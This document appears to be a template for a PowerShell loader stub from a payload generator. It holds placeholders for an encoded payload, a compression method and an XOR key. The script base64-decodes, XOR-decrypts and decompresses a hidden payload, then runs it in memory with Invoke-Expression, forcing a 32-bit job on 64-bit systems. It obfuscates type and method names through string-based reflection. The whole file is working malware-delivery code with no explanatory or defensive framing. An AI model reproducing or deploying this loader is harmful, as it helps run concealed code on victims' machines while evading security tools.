Set-StrictMode -Version 2;
function decode_stream{
    Param($base_64_string, $compression_method, $encryption_key);
    [Byte[]]$base64_decoded = ([type]('Convert'))::('FromBase64String').Invoke($base_64_string);
    for ($byte_index = 0; $byte_index -lt $base64_decoded.('Count'); $byte_index++) {$base64_decoded[$byte_index] = $base64_decoded[$byte_index] -bxor $encryption_key;};
    return (New-Object IO.StreamReader(New-Object($compression_method)((New-Object IO.MemoryStream(,$base64_decoded)),([type]('IO.Compression.CompressionMode'))::'Decompress')),([type]('text.encoding'))::'utf8').('ReadToEnd').Invoke();
};
$execute_payload = decode_stream '{{EXECUTOR}}' 'system.io.compression.{{METHOD}}' '{{XOR_KEY}}';
If (([type]('IntPtr'))::'size' -eq 8) {
    start-job {
        param($argument);
        Invoke-Expression $argument;
    } -RunAs32 -Argument $execute_payload | wait-job | Receive-Job
} else { Invoke-Expression $execute_payload };
